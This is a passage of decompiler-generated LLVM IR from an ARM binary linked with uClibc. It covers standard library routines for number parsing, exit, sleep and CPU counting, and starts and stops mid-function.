  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v0_17c74 = load i32, i32* @r1, align 4
  store i32 %v0_17c74, i32* %fp.global-to-local, align 4
  %v0_17c78 = load i32, i32* @r2, align 4
  store i32 %v0_17c78, i32* %r5.global-to-local, align 4
  %v0_17c7c = load i32, i32* @r0, align 4
  store i32 %v0_17c7c, i32* %r4.global-to-local, align 4
  %v0_17c80 = load i32, i32* @r3, align 4
  br label %dec_label_pc_17c8c

dec_label_pc_17c88:                               ; preds = %dec_label_pc_17c8c
  %v1_17c88 = add i32 %v0_17cc4, 1
  store i32 %v1_17c88, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17c8c

dec_label_pc_17c8c:                               ; preds = %entry, %dec_label_pc_17c88
  %v0_17cc4 = phi i32 [ %v0_17c7c, %entry ], [ %v1_17c88, %dec_label_pc_17c88 ]
  %v1_17c8c = inttoptr i32 %v0_17cc4 to i8*
  %v2_17c8c = load i8, i8* %v1_17c8c, align 1
  %v3_17c8c = zext i8 %v2_17c8c to i32
  %v4_17c90 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 580) to i32*), align 4
  %v2_17c94 = mul nuw nsw i32 %v3_17c8c, 2
  %v2_17c98 = add i32 %v2_17c94, %v4_17c90
  %v3_17c98 = inttoptr i32 %v2_17c98 to i16*
  %v4_17c98 = load i16, i16* %v3_17c98, align 2
  %v1_17c9c = and i16 %v4_17c98, 32
  %v2_17c9c = icmp eq i16 %v1_17c9c, 0
  br i1 %v2_17c9c, label %dec_label_pc_17ca4, label %dec_label_pc_17c88

dec_label_pc_17ca4:                               ; preds = %dec_label_pc_17c8c
  %v7_17ca4 = icmp eq i8 %v2_17c8c, 43
  br i1 %v7_17ca4, label %dec_label_pc_17cc4, label %dec_label_pc_17cac

dec_label_pc_17cac:                               ; preds = %dec_label_pc_17ca4
  %v7_17cac = icmp eq i8 %v2_17c8c, 45
  br i1 %v7_17cac, label %dec_label_pc_17cc4, label %bb

bb:                                               ; preds = %dec_label_pc_17cac
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17cc8

dec_label_pc_17cc4:                               ; preds = %dec_label_pc_17ca4, %dec_label_pc_17cac
  %storemerge47 = phi i32 [ 1, %dec_label_pc_17cac ], [ 0, %dec_label_pc_17ca4 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_17cc4 = add i32 %v0_17cc4, 1
  store i32 %v1_17cc4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17cc8

dec_label_pc_17cc8:                               ; preds = %bb, %dec_label_pc_17cc4
  %v0_17ce8 = phi i32 [ %v0_17cc4, %bb ], [ %v1_17cc4, %dec_label_pc_17cc4 ]
  %v1_17cc8 = and i32 %v0_17c78, -17
  %v3_17cc8 = icmp eq i32 %v1_17cc8, 0
  br i1 %v3_17cc8, label %dec_label_pc_17cd4, label %bb60

bb60:                                             ; preds = %dec_label_pc_17cc8
  br label %bb64

dec_label_pc_17cd4:                               ; preds = %dec_label_pc_17cc8
  %v1_17cd4 = inttoptr i32 %v0_17ce8 to i8*
  %v2_17cd4 = load i8, i8* %v1_17cd4, align 1
  %v7_17cd8 = icmp eq i8 %v2_17cd4, 48
  %v1_17cdc = add i32 %v0_17c78, 10
  store i32 %v1_17cdc, i32* %r5.global-to-local, align 4
  br i1 %v7_17cd8, label %dec_label_pc_17ce8, label %bb61

bb61:                                             ; preds = %dec_label_pc_17cd4
  br label %.thread8

dec_label_pc_17ce8:                               ; preds = %dec_label_pc_17cd4
  %v1_17ce8 = add i32 %v0_17ce8, 1
  %v2_17ce8 = inttoptr i32 %v1_17ce8 to i8*
  %v3_17ce8 = load i8, i8* %v2_17ce8, align 1
  %v4_17ce8 = zext i8 %v3_17ce8 to i32
  store i32 %v1_17ce8, i32* %r4.global-to-local, align 4
  %v1_17cec = or i32 %v4_17ce8, 32
  %v7_17cf0 = icmp eq i32 %v1_17cec, 120
  %v1_17cf4 = add i32 %v0_17c78, 8
  store i32 %v1_17cf4, i32* %r5.global-to-local, align 4
  br i1 %v7_17cf0, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_17ce8
  %v3_17d00 = mul i32 %v1_17cf4, 2
  store i32 %v3_17d00, i32* %r5.global-to-local, align 4
  %v2_17d04 = add i32 %v0_17ce8, 2
  store i32 %v2_17d04, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_17ce8, %bb61, %bb62
  %v1_17dd030 = phi i32 [ %v0_17c7c, %bb61 ], [ %v1_17ce8, %bb62 ], [ %v1_17ce8, %dec_label_pc_17ce8 ]
  %v0_17d5421 = phi i32 [ %v0_17ce8, %bb61 ], [ %v2_17d04, %bb62 ], [ %v1_17ce8, %dec_label_pc_17ce8 ]
  %v0_17d08 = phi i32 [ %v1_17cdc, %bb61 ], [ %v3_17d00, %bb62 ], [ %v1_17cf4, %dec_label_pc_17ce8 ]
  %v5_17d0c = icmp slt i32 %v0_17d08, 16
  br i1 %v5_17d0c, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_17dd029 = phi i32 [ %v0_17c7c, %bb60 ], [ %v1_17dd030, %.thread8 ], [ %v1_17dd030, %bb63 ]
  %v0_17d5420 = phi i32 [ %v0_17ce8, %bb60 ], [ %v0_17d5421, %.thread8 ], [ %v0_17d5421, %bb63 ]
  %v0_17d34 = phi i32 [ %v0_17c78, %bb60 ], [ %v0_17d08, %.thread8 ], [ 16, %bb63 ]
  %v1_17d10 = add i32 %v0_17d34, -2
  %tmp = icmp ugt i32 %v1_17d10, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_17d20

.thread:                                          ; preds = %bb64
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_17dcc

dec_label_pc_17d20:                               ; preds = %bb64
  %v2_17d28 = udiv i32 -1, %v0_17d34
  %v3_17d28 = urem i32 -1, %v0_17d34
  %v1_17d38 = urem i32 %v3_17d28, 256
  store i32 %v1_17d38, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 %v2_17d28, i32* %r8.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_17d54

dec_label_pc_17d50:                               ; preds = %bb71, %dec_label_pc_17db0
  %v0_17d50 = phi i32 [ %v1_17d9044, %bb71 ], [ %v0_17d50.pre, %dec_label_pc_17db0 ]
  br label %dec_label_pc_17d54

dec_label_pc_17d54:                               ; preds = %dec_label_pc_17d20, %dec_label_pc_17d50
  %v1_17dd027 = phi i32 [ %v1_17dd029, %dec_label_pc_17d20 ], [ %v0_17d50, %dec_label_pc_17d50 ]
  %v0_17d90 = phi i32 [ %v0_17d5420, %dec_label_pc_17d20 ], [ %v0_17d50, %dec_label_pc_17d50 ]
  %v1_17d54 = inttoptr i32 %v0_17d90 to i8*
  %v2_17d54 = load i8, i8* %v1_17d54, align 1
  %v3_17d54 = zext i8 %v2_17d54 to i32
  %v1_17d58 = add nsw i32 %v3_17d54, -48
  %v1_17d5c = urem i32 %v1_17d58, 256
  %v1_17d64 = or i32 %v3_17d54, 32
  %tmp79 = icmp ult i32 %v1_17d5c, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_17d6c

dec_label_pc_17d6c:                               ; preds = %dec_label_pc_17d54
  %tmp80 = icmp ugt i32 %v1_17d64, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_17d6c
  %v1_17d70 = add nsw i32 %v1_17d64, -87
  %v5_17d78 = urem i32 %v1_17d70, 256
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_17d54, %dec_label_pc_17d6c, %bb65
  %v3_17da8 = phi i32 [ %v1_17d5c, %dec_label_pc_17d54 ], [ 40, %dec_label_pc_17d6c ], [ %v5_17d78, %bb65 ]
  %v1_17d7c = load i32, i32* %r5.global-to-local, align 4
  %v6_17d80 = icmp slt i32 %v3_17da8, %v1_17d7c
  br i1 %v6_17d80, label %dec_label_pc_17d84, label %dec_label_pc_17dcc.loopexit

dec_label_pc_17d84:                               ; preds = %bb66
  %v0_17d84 = load i32, i32* @ip, align 4
  %v1_17d84 = load i32, i32* %r8.global-to-local, align 4
  %v9_17d84 = icmp eq i32 %v0_17d84, %v1_17d84
  br i1 %v9_17d84, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_17d84
  %v1_17d9040 = add i32 %v0_17d90, 1
  store i32 %v1_17d9040, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17d98

bb67:                                             ; preds = %dec_label_pc_17d84
  %v3_17d84 = icmp ult i32 %v0_17d84, %v1_17d84
  %v1_17d90 = add i32 %v0_17d90, 1
  store i32 %v1_17d90, i32* %r4.global-to-local, align 4
  br i1 %v3_17d84, label %dec_label_pc_17d98, label %dec_label_pc_17db0

dec_label_pc_17d98:                               ; preds = %bb67, %.thread39
  %v1_17d9044 = phi i32 [ %v1_17d9040, %.thread39 ], [ %v1_17d90, %bb67 ]
  %v4_17da02443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_17d98 = load i32, i32* %sl.global-to-local, align 4
  %v3_17d98 = icmp uge i32 %v3_17da8, %v1_17d98
  %v9_17d98 = icmp eq i32 %v3_17da8, %v1_17d98
  %v2_17d9c = xor i1 %v3_17d98, true
  %v3_17d9c = or i1 %v9_17d98, %v2_17d9c
  br i1 %v3_17d9c, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_17d98
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_17d98, %bb68
  %v4_17da0 = phi i32 [ %v4_17da02443, %dec_label_pc_17d98 ], [ 0, %bb68 ]
  %v2_17da0 = xor i1 %v9_17d98, true
  %v3_17da0 = and i1 %v3_17d98, %v2_17da0
  br i1 %v3_17da0, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_17da0 = urem i32 %v4_17da0, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_17da4 = phi i32 [ %v5_17da0, %bb70 ], [ %v4_17da0, %bb69 ]
  %v2_17da4 = icmp eq i32 %v0_17da4, 0
  br i1 %v2_17da4, label %bb71, label %dec_label_pc_17db0

bb71:                                             ; preds = %thread-pre-split
  %v4_17da8 = mul i32 %v0_17d84, %v1_17d7c
  %v5_17da8 = add i32 %v4_17da8, %v3_17da8
  store i32 %v5_17da8, i32* @ip, align 4
  br label %dec_label_pc_17d50

dec_label_pc_17db0:                               ; preds = %bb67, %thread-pre-split
  %v0_17db0 = call i32 @__GI___errno_location()
  %v0_17db8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_17db8, i32* @ip, align 4
  %v0_17dbc = load i32, i32* %r7.global-to-local, align 4
  %v2_17dbc = and i32 %v0_17dbc, %v0_17c80
  store i32 %v2_17dbc, i32* %r7.global-to-local, align 4
  %v2_17dc4 = inttoptr i32 %v0_17db0 to i32*
  store i32 34, i32* %v2_17dc4, align 4
  %v0_17d50.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17d50

dec_label_pc_17dcc.loopexit:                      ; preds = %bb66
  %v0_17dcc.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_17dcc

dec_label_pc_17dcc:                               ; preds = %.thread, %dec_label_pc_17dcc.loopexit
  %v1_17dd0 = phi i32 [ %v1_17dd027, %dec_label_pc_17dcc.loopexit ], [ %v1_17dd029, %.thread ]
  %v2_17dd0 = phi i32 [ %v0_17dcc.pre, %dec_label_pc_17dcc.loopexit ], [ %v0_17c74, %.thread ]
  %v2_17dcc = icmp eq i32 %v2_17dd0, 0
  br i1 %v2_17dcc, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_17dcc
  %v3_17dd0 = inttoptr i32 %v2_17dd0 to i32*
  store i32 %v1_17dd0, i32* %v3_17dd0, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_17dcc, %bb72
  %v0_17dd8 = load i32, i32* %r7.global-to-local, align 4
  %v2_17dd8 = icmp eq i32 %v0_17dd8, 0
  %. = select i1 %v2_17dd8, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v2_17de4 = icmp eq i32 %v0_17c80, 0
  %v0_17e08.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_17de4, label %dec_label_pc_17e00, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_17e08.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_17df0, label %dec_label_pc_17e00

dec_label_pc_17df0:                               ; preds = %bb76
  %v0_17df0 = call i32 @__GI___errno_location()
  %v2_17df8 = inttoptr i32 %v0_17df0 to i32*
  store i32 34, i32* %v2_17df8, align 4
  %v0_17dfc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17dfc, i32* @ip, align 4
  %v0_17e00.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17e00

dec_label_pc_17e00:                               ; preds = %bb76, %bb73, %dec_label_pc_17df0
  %v0_17e08.pre = phi i32 [ %v0_17e08.pre.pre, %bb76 ], [ %v0_17dfc, %dec_label_pc_17df0 ], [ %v0_17e08.pre.pre, %bb73 ]
  %v0_17e00 = phi i32 [ %v0_17dd8, %bb76 ], [ %v0_17e00.pre, %dec_label_pc_17df0 ], [ %v0_17dd8, %bb73 ]
  %v2_17e00 = icmp eq i32 %v0_17e00, 0
  br i1 %v2_17e00, label %dec_label_pc_17e00._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_17e00
  %v2_17e04 = sub i32 0, %v0_17e08.pre
  store i32 %v2_17e04, i32* @ip, align 4
  br label %dec_label_pc_17e00._crit_edge

dec_label_pc_17e00._crit_edge:                    ; preds = %dec_label_pc_17e00, %bb77
  %v0_17e08 = phi i32 [ %v2_17e04, %bb77 ], [ %v0_17e08.pre, %dec_label_pc_17e00 ]
  ret i32 %v0_17e08

; uselistorder directives
  uselistorder i32 %v0_17e08.pre, { 1, 0 }
  uselistorder i32 %v0_17e08.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_17da0, { 1, 0 }
  uselistorder i1 %v3_17d98, { 1, 0 }
  uselistorder i32 %v1_17d98, { 1, 0 }
  uselistorder i32 %v1_17d64, { 1, 0 }
  uselistorder i32 %v1_17d5c, { 1, 0 }
  uselistorder i32 %v0_17d90, { 1, 0, 2 }
  uselistorder i32 %v0_17d50, { 1, 0 }
  uselistorder i32 %v3_17d00, { 1, 0 }
  uselistorder i32 %v1_17cf4, { 1, 0, 2 }
  uselistorder i32 %v0_17ce8, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_17cc4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_17c80, { 1, 0 }
  uselistorder i32 %v0_17c7c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_17c78, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_17e00._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_17e00, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_17dcc, { 1, 0 }
  uselistorder label %dec_label_pc_17db0, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17d54, { 1, 0 }
  uselistorder label %dec_label_pc_17d50, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17cc8, { 1, 0 }
  uselistorder label %dec_label_pc_17cc4, { 1, 0 }
  uselistorder label %dec_label_pc_17c8c, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r5, align 4
  %v4_17e2c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 100) to i32*), align 4
  store i32 %v4_17e2c, i32* @r4, align 4
  %v2_17e34 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_17e4c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_17e4c)
  %v0_17e60 = load i32, i32* @r5, align 4
  %v2_17e60 = add i32 %v0_17e60, 20
  %v3_17e60 = inttoptr i32 %v2_17e60 to i32*
  %v4_17e60 = load i32, i32* %v3_17e60, align 4
  call void @__pseudo_branch(i32 %v4_17e60)
  %v0_17e70 = load i32, i32* @r5, align 4
  %v2_17e70 = add i32 %v0_17e70, 26324
  %v3_17e70 = inttoptr i32 %v2_17e70 to i32*
  %v4_17e70 = load i32, i32* %v3_17e70, align 4
  %v2_17e74 = icmp eq i32 %v4_17e70, 0
  br i1 %v2_17e74, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_17e80 = xor i1 %v2_17e74, true
  call void @__pseudo_cond_branch(i1 %v2_17e80, i32 %v4_17e70)
  store i32 %v2_17e34, i32* @r0, align 4
  %v0_17e90 = load i32, i32* @r5, align 4
  %v2_17e90 = add i32 %v0_17e90, 28
  %v3_17e90 = inttoptr i32 %v2_17e90 to i32*
  %v4_17e90 = load i32, i32* %v3_17e90, align 4
  call void @__pseudo_branch(i32 %v4_17e90)
  %v0_17e9c = call i32 @__GI___uClibc_fini()
  %v0_17ea4 = load i32, i32* @r5, align 4
  %v2_17ea4 = add i32 %v0_17ea4, -104948
  %v9_17ea4 = icmp eq i32 %v2_17ea4, 0
  br i1 %v9_17ea4, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_17eac = xor i1 %v9_17ea4, true
  call void @__pseudo_cond_branch(i1 %v2_17eac, i32 %v2_17ea4)
  %v0_17eb0 = load i32, i32* @r6, align 4
  %v1_17eb4 = call i32 @__GI__exit(i32 %v0_17eb0)
  %v0_17eb8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17eb8, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v1_17eb8 = load i32, i32* @r6, align 4
  %v3_17eb8 = load i32, i32* @r1, align 4
  %v4_17eb8 = inttoptr i32 %v3_17eb8 to i32*
  store i32 %v1_17eb8, i32* %v4_17eb8, align 4
  %v5_17eb8 = load i32, i32* @r4, align 4
  %v6_17eb8 = load i32, i32* @r1, align 4
  %v7_17eb8 = sub i32 %v6_17eb8, %v5_17eb8
  store i32 %v7_17eb8, i32* @r1, align 4
  store i32 0, i32* @r6, align 4
  %v9_17ecc = sub i32 0, %v5_17eb8
  %v8_17ed0 = shl i32 %v4_17e90, %v9_17ecc
  %v9_17ed0 = and i32 %v8_17ed0, %v9_17ecc
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v10_17ed0 = phi i32 [ %v1_17eb4, %bb9 ], [ %v9_17ed0, %bb10 ]
  ret i32 %v10_17ed0

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_17ed8 = load i32, i32* @r4, align 4
  %v6_17ed8 = load i32, i32* @lr, align 4
  %v2_17edc = icmp eq i32 %arg1, 0
  store i32 0, i32* @r4, align 4
  br i1 %v2_17edc, label %dec_label_pc_17f70, label %dec_label_pc_17eec

dec_label_pc_17eec:                               ; preds = %entry
  %v2_17efc = ptrtoint i32* %stack_var_-44 to i32
  store i32 65536, i32* %stack_var_-24, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v3_17f10 = call i32 @__libc_sigaction(i32 17, i32 0, i32 %v2_17efc)
  %v3_17f14 = load i32, i32* %stack_var_-44, align 4
  %v7_17f18 = icmp eq i32 %v3_17f14, 1
  br i1 %v7_17f18, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_17eec
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17eec, %bb
  call void @__pseudo_cond_branch(i1 %v7_17f18, i32 ptrtoint (i32* @global_var_14350.1472 to i32))
  %v2_17f2c = ptrtoint i32* %stack_var_-16 to i32
  %v2_17f34 = call i32 @__libc_nanosleep(i32 %v2_17f2c, i32 %v2_17f2c)
  %v2_17f38 = icmp eq i32 %v2_17f34, 0
  br i1 %v2_17f38, label %bb19, label %bb18

bb18:                                             ; preds = %.thread2
  %v3_17f4c = load i32, i32* %stack_var_-16, align 4
  br label %bb19

bb19:                                             ; preds = %.thread2, %bb18
  %storemerge = phi i32 [ %v3_17f4c, %bb18 ], [ 0, %.thread2 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v3_17f5c = load i32, i32* %stack_var_-24, align 4
  %v1_17f60 = and i32 %v3_17f5c, 65536
  %v2_17f60 = icmp eq i32 %v1_17f60, 0
  br i1 %v2_17f60, label %bb20, label %.thread6

bb20:                                             ; preds = %bb19
  br label %.thread6

.thread6:                                         ; preds = %bb19, %bb20
  call void @__pseudo_cond_branch(i1 %v2_17f60, i32 ptrtoint (i32* @global_var_14350.1472 to i32))
  %v0_17f70.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17f70

dec_label_pc_17f70:                               ; preds = %entry, %.thread6
  %v0_17f70 = phi i32 [ %v0_17f70.pre, %.thread6 ], [ 0, %entry ]
  store i32 %v3_17ed8, i32* @r4, align 4
  store i32 %v6_17ed8, i32* @lr, align 4
  ret i32 %v0_17f70

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17f70, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -34372), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_17fa4 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -34372))
  store i32 %v1_17fa4, i32* @r6, align 4
  %v2_17fa8 = icmp eq i32 %v1_17fa4, 0
  br i1 %v2_17fa8, label %dec_label_pc_18028, label %dec_label_pc_17fb0

dec_label_pc_17fb0:                               ; preds = %entry
  store i32 580, i32* @sl, align 4
  %v0_17fb8 = load i32, i32* @r4, align 4
  %v2_17fb8 = add i32 %v0_17fb8, -34360
  store i32 %v2_17fb8, i32* @r8, align 4
  %v2_17fbc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_17fbc, i32* @r7, align 4
  br label %bb18

dec_label_pc_17fc4:                               ; preds = %bb18
  %v3_17fc4 = load i32, i32* %stack_var_-36, align 4
  %v1_17fc8 = inttoptr i32 %v3_17fc4 to i32*
  %v2_17fc8 = load i32, i32* %v1_17fc8, align 4
  %v1_17fcc = inttoptr i32 %v2_17fc8 to i8*
  %v2_17fcc = load i8, i8* %v1_17fcc, align 1
  %v7_17fd0 = icmp eq i8 %v2_17fcc, 99
  br i1 %v7_17fd0, label %dec_label_pc_17fd8, label %.backedge3

dec_label_pc_17fd8:                               ; preds = %dec_label_pc_17fc4
  %v1_17fd8 = add i32 %v2_17fc8, 1
  %v2_17fd8 = inttoptr i32 %v1_17fd8 to i8*
  %v3_17fd8 = load i8, i8* %v2_17fd8, align 1
  %v7_17fdc = icmp eq i8 %v3_17fd8, 112
  br i1 %v7_17fdc, label %dec_label_pc_17fe4, label %.backedge3

dec_label_pc_17fe4:                               ; preds = %dec_label_pc_17fd8
  %v1_17fe4 = add i32 %v2_17fc8, 2
  %v2_17fe4 = inttoptr i32 %v1_17fe4 to i8*
  %v3_17fe4 = load i8, i8* %v2_17fe4, align 1
  %v7_17fe8 = icmp eq i8 %v3_17fe4, 117
  br i1 %v7_17fe8, label %dec_label_pc_17ff0, label %.backedge3

dec_label_pc_17ff0:                               ; preds = %dec_label_pc_17fe4
  %v1_17ff0 = add i32 %v2_17fc8, 3
  %v2_17ff0 = inttoptr i32 %v1_17ff0 to i8*
  %v3_17ff0 = load i8, i8* %v2_17ff0, align 1
  %v4_17ff0 = zext i8 %v3_17ff0 to i32
  %v0_17ff4 = load i32, i32* @r4, align 4
  %v1_17ff4 = load i32, i32* @sl, align 4
  %v2_17ff4 = add i32 %v1_17ff4, %v0_17ff4
  %v3_17ff4 = inttoptr i32 %v2_17ff4 to i32*
  %v4_17ff4 = load i32, i32* %v3_17ff4, align 4
  %v2_17ff8 = mul nuw nsw i32 %v4_17ff0, 2
  %v2_17ffc = add i32 %v4_17ff4, %v2_17ff8
  %v3_17ffc = inttoptr i32 %v2_17ffc to i16*
  %v4_17ffc = load i16, i16* %v3_17ffc, align 2
  %v1_18000 = and i16 %v4_17ffc, 8
  %v2_18000 = icmp eq i16 %v1_18000, 0
  br i1 %v2_18000, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_17ff0
  %v1_18004 = load i32, i32* @r5, align 4
  %v2_18004 = add i32 %v1_18004, 1
  store i32 %v2_18004, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_17ff0, %dec_label_pc_17fc4, %dec_label_pc_17fd8, %dec_label_pc_17fe4
  %v0_18008.pre = load i32, i32* @r6, align 4
  %v0_18014.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_17fb0
  %v0_18014 = phi i32 [ %v0_18014.pre, %.backedge3 ], [ %v2_17fb8, %dec_label_pc_17fb0 ]
  %v0_18008 = phi i32 [ %v0_18008.pre, %.backedge3 ], [ %v1_17fa4, %dec_label_pc_17fb0 ]
  %v4_18018 = inttoptr i32 %v0_18008 to i32*
  %v5_18018 = call i32 @__GI_config_read(i32* %v4_18018, i32 %v2_17fbc, i32 258, i32 %v0_18014)
  %v2_1801c = icmp eq i32 %v5_18018, 0
  br i1 %v2_1801c, label %dec_label_pc_1808c, label %dec_label_pc_17fc4

dec_label_pc_18028:                               ; preds = %entry
  %v0_1802c = load i32, i32* @r4, align 4
  %v2_1802c = add i32 %v0_1802c, -34356
  store i32 %v2_1802c, i32* @r0, align 4
  %v1_18030 = call i32 @__GI_config_open(i32 %v2_1802c)
  store i32 %v1_18030, i32* @r6, align 4
  %v2_18034 = icmp eq i32 %v1_18030, 0
  br i1 %v2_18034, label %bb19, label %dec_label_pc_18040

bb19:                                             ; preds = %dec_label_pc_18028
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1808c

dec_label_pc_18040:                               ; preds = %dec_label_pc_18028
  %v0_18044 = load i32, i32* @r4, align 4
  %v2_18044 = add i32 %v0_18044, -34340
  store i32 %v2_18044, i32* @r8, align 4
  %v2_1804c = add i32 %v0_18044, -34304
  store i32 %v2_1804c, i32* @r7, align 4
  %v2_18050 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_18050, i32* @r4, align 4
  br label %bb21

dec_label_pc_18058:                               ; preds = %bb21
  %v0_18084 = load i32, i32* @r8, align 4
  %v3_18058 = load i32, i32* %stack_var_-36, align 4
  %v1_1805c = inttoptr i32 %v3_18058 to i32*
  %v2_1805c = load i32, i32* %v1_1805c, align 4
  store i32 %v2_1805c, i32* @r1, align 4
  %v2_18060 = inttoptr i32 %v0_18084 to i8*
  %v3_18060 = call i32 @__GI_strcoll(i8* %v2_18060, i32 %v2_1805c)
  %v2_18064 = icmp eq i32 %v3_18060, 0
  br i1 %v2_18064, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_18058
  %v1_18068 = load i32, i32* @r5, align 4
  %v2_18068 = add i32 %v1_18068, 1
  store i32 %v2_18068, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_18058
  %v0_18074.pre = load i32, i32* @r7, align 4
  %v0_18078.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_18040
  %v0_18078 = phi i32 [ %v0_18078.pre, %.backedge ], [ %v1_18030, %dec_label_pc_18040 ]
  %v0_18074 = phi i32 [ %v0_18074.pre, %.backedge ], [ %v2_1804c, %dec_label_pc_18040 ]
  %v4_1807c = inttoptr i32 %v0_18078 to i32*
  %v5_1807c = call i32 @__GI_config_read(i32* %v4_1807c, i32 %v2_18050, i32 459266, i32 %v0_18074)
  %v2_18080 = icmp eq i32 %v5_1807c, 0
  br i1 %v2_18080, label %dec_label_pc_1808c, label %dec_label_pc_18058

dec_label_pc_1808c:                               ; preds = %bb18, %bb21, %bb19
  %v0_1808c = load i32, i32* @r6, align 4
